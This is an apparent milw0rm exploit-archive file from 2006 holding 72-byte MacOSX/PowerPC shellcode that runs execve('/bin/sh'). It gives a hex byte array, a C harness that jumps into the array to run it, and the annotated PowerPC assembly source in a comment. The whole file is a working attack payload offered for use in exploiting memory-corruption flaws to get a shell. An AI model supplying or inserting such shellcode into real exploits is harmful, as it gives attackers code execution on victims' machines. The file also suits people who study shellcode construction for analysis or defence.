/*
 * [MacOSX/PowerPC]
 * Shellcode for: execve("/bin/sh", ["/bin/sh"], NULL), exit()
 * 72 bytes
 * hophet [at] gmail.com
 * http://www.nlabs.com.br/~hophet/
 *
 */

#include <stdio.h>
#include <string.h>

char shellcode[] =

"\x7c\xa5\x2a\x79"
"\x40\x82\xff\xfd"
"\x7d\x68\x02\xa6"
"\x3b\xeb\x01\x71"
"\x39\x40\x01\x71"
"\x39\x1f\xfe\xce"
"\x7c\xa8\x29\xae"
"\x38\x7f\xfe\xc7"
"\x90\x61\xff\xf8"
"\x90\xa1\xff\xfc"
"\x38\x81\xff\xf8"
"\x38\x0a\xfe\xca"
"\x44\xff\xff\x02"
"\x60\x60\x60\x60"
"\x38\x0a\xfe\x90"
"\x44\xff\xff\x02"
"\x2f\x62\x69\x6e"
"\x2f\x73\x68\x54";

int main() {

	void (*p)();
	p = (void *)&shellcode;
	printf("Lenght: %d\n", strlen(shellcode));
	p();
}
/*
.globl _main
.text
_main:
        xor.    r5, r5, r5	// r5 = NULL
        bnel    _main
        mflr    r11
        addi    r31, r11, 369
        li      r10, 369
        addi    r8, r31, -306
        stbx    r5, r8, r5
        addi    r3, r31, -313
        stw     r3, -8(r1)	// [/bin/sh]
        stw     r5, -4(r1)
        subi    r4, r1, 8	// [/bin/sh]
        addi    r0, r10, -310	// r0 = 59
        .long   0x44ffff02	// sc opcode
        .long	0x60606060	// NOP
        addi    r0, r10, -368	// r0 = 1
        .long   0x44ffff02	// sc opcode
string:	.asciz	"/bin/shT"
*/

// milw0rm.com [2006-05-01]